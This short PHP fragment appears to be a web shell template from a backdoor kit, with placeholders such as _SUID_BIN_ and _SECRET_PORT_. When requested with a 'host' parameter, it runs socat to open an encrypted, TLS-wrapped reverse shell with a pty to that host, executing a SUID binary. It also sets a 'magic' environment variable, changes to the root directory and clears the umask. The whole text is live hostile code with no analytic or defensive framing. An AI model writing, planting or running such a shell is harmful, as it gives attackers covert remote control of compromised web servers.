...
$ip=$_GET["host"];$write_a=null;$error_a=null;$shell="socat exec:'_SUID_BIN_',pty,stderr,setsid,sigint,sane openssl-connect:$ip:_SECRET_PORT_,cert=_CLIENTPEMPATH_,cafile=_SERVERCRTPATH_,verify=0";
putenv("_MAGIC_VAR_=1");chdir("/");umask(0);exec($shell);?>